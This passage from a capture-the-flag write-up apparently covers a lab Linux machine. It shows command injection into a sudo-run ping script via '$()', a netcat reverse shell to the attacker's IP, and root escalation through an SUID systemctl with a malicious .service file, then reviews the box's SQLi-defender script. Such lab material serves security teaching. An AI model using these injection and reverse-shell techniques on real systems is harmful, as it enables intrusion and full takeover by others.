What the script author left out was the bash syntax to run a command with `$()`. I can test this:

```

www-data@jasmin:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
***********************************************

Enter an IP: 10.10.14.$(echo 8)
PING 10.10.14.8 (10.10.14.8) 56(84) bytes of data.
64 bytes from 10.10.14.8: icmp_seq=1 ttl=63 time=29.5 ms
64 bytes from 10.10.14.8: icmp_seq=2 ttl=63 time=31.0 ms
64 bytes from 10.10.14.8: icmp_seq=3 ttl=63 time=85.5 ms
64 bytes from 10.10.14.8: icmp_seq=4 ttl=63 time=107 ms
64 bytes from 10.10.14.8: icmp_seq=5 ttl=63 time=129 ms
^C
--- 10.10.14.8 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 29.554/76.642/129.727/40.347 ms

```

My `$(echo 8)` returns 8 and my ping to 10.10.14.8 works.

### Reverse Shell

None of the reverse shells I know of can run without at least one of the those characters, but I can just write what I want to run into a file, and then call that file.

```

www-data@jasmin:/tmp$ echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.8 443'
#!/bin/bash

nc -e /bin/bash 10.10.14.8 443
www-data@jasmin:/tmp$
www-data@jasmin:/tmp$ echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.8 443' > /tmp/d.sh
www-data@jasmin:/tmp$ chmod +x /tmp/d.sh
www-data@jasmin:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es
***********************************************

Enter an IP: $(/tmp/d.sh)

```

I get a shell as pepper:

```

root@kali# nc -nlvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:37144.
id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)

```

Now I can grab `user.txt`:

```

pepper@jasmin:~$ cat user.txt 
2afa36c4...

```

## Priv: pepper –> root

### Enumeration

I uploaded `LinEnum.sh` and ran it (with `-t`). The SUID section was interesting:

```

[-] SUID files:
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount                
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping                      
-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctl       
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount                                             
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su                            
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp                  
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd                  
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd                                                            
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh                                                   
-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 Mar  1 11:19 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

I’m specifically interested in `/bin/systemctl`. This binary is a systemd utility which is responsible for Controlling the systemd system and service manager. That is, it creates and manages services. And in this case, only root and users in the group pepper (me) can run it, and it will run as root.

### Malicious Service

A service is defined by a `.service` file. The `systemctl` is used to link it to `systemd`, and then used again to start the service. What the service does is defined by the `.service` file.

[gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a page for `systemctl`, and it gives an example where a single command is executed and output to a file in `tmp`. I’ll modify that slightly to give me a shell.

```

pepper@jasmin:/dev/shm$ cat >0xdf.service<<EOF
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
EOF

```

Now I use `systemctl` to link this service:

```

pepper@jasmin:/dev/shm$ systemctl link /dev/shm/0xdf.service

```

Now start the service, with a `nc` listener ready to catch the shell:

```

pepper@jasmin:/dev/shm$ systemctl start 0xdf

```

My listener gets a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:37160.
id
uid=0(root) gid=0(root) groups=0(root)

```

After upgrading my shell, I’ll grab `root.txt`:

```

root@jasmin:/root# cat root.txt 
d41d8cd9...

```

## Beyond Root

Besides `root.txt`, there are two scripts in `/root/`:

```

root@jasmin:/root# ls
clean.sh  root.txt  sqli_defender.py

```

### clean.sh

`clean.sh` empties the Apache access logs:

```

root@jasmin:~# cat clean.sh 
#!/bin/bash
> /var/log/apache2/access.log

```

This script is being run every 15 minutes:

```

root@jasmin:~# crontab -l | grep -v "#"
 */15 * * * * /root/clean.sh

```

### sqli\_defender.py

`sqli_defender.py` is a longer python script. I can also see it’s running as root:

```

root@jasmin:~# ps auxww | grep sqli_defender
root        383  0.7  1.6  61916 16320 ?        Ss   08:29   0:06 python3 /root/sqli_defender.py

```

I won’t show the entire script here, but the main function is here:

```

if __name__ == '__main__':
    local_ip = netifaces.ifaddresses('ens33')[netifaces.AF_INET][0]['addr']
    time_counter = datetime.now()
    attackers = {}
    show_banner()
    logfile = open('/var/log/apache2/access.log','r')
    loglines = follow(logfile)
    for line in loglines:
        log = parse_log(line)
        if log:
            if time_counter + timedelta(seconds=8) < datetime.now():
                attackers[log.ip] = 0
                time_counter = datetime.now()
            if log.ip in attackers and 'room.php?cod' in log.req:
                attackers[log.ip] = attackers[log.ip] + 1
            else:
                attackers[log.ip] = 1
            if attackers[log.ip] > 5:
                log.flag = 4
            if log.flag != 0:
                warn_log(log)

```

It opens the Apache access logs, and then reads the lines using `follow`, which is a generator function that will effectively just return new lines as they are added to the log:

```

def follow(thefile):                 
    thefile.seek(0,2)                                  
    while True:              
        line = thefile.readline()
        if not line:
            sleep(0.01)
            continue
        yield line    

```

Then, for each line, it will first check if it’s been eight seconds since the last log, and if so, reset the counter. Then it will increment the counter if `room.php?cod` is in the request. Finally, it will set the log flag to four if the count is greater than five. And if the flag isn’t 0, it calls `warn_log`.

The `warn_log` function will write some logs, but it also starts a thread on `ban` if the flag value is four, which it will be:

```

def warn_log(attack):
    print('[+] Detected ' + str(attack.ip) + ' ' + str(attack.flag))
    cont = 0
    path = '/home/pepper/Web/Logs/'
    attack_date = attack.date.split('-')[0] + '-' + attack.month + '-' + attack.date.split('-')[2]
    if attack.flag == 4:
        threading.Thread(target=ban, args=(attack,)).start()                                      
    if not os.path.isfile(path + attack.ip + '.txt'):
        f = open(path + attack.ip + '.txt', 'w')                                                              
        f.write(attack.ip + '\n' + '-------------' + '\n')
        f.close()
    else:
        f = open(path + attack.ip + '.txt', 'r')
        for i in f.readlines():
            if 'Attack' in i:
                cont = int(i.split(' ')[1])
        f.close()
    f = open(path + attack.ip + '.txt', 'a')
    f.write('Attack %d : Level %d : %s : %s\n\n' %((cont+1), attack.flag, attack_date, attack.req))
    f.close()

```

`ban` sets IP tables rules that redirect port 80 to port 64999:

```

def ban(attack):
    num = 0
    print (local_ip)
    if not attack.ip in banned:
        banned.append(attack.ip)
        print(attack.ip)
        print(local_ip)
        os.system('iptables -t nat -I PREROUTING --src %s --dst %s -p tcp --dport 80 -j REDIRECT --to-ports 64999' %(attack.ip, local_ip))
        print('[+] %s banned' % attack.ip)
        banned_list = os.popen('iptables -t nat --line-numbers -L')
        for i in banned_list.read().split('\n'):
            if attack.ip in i:
                num = int(i.split(' ')[0])
        if num != 0:
            sleep(90)
            os.system('iptables -t nat -D PREROUTING %d' % num)
            banned.remove(attack.ip)
            print('[+] %s disbanned' % attack.ip)
    else:
        pass

```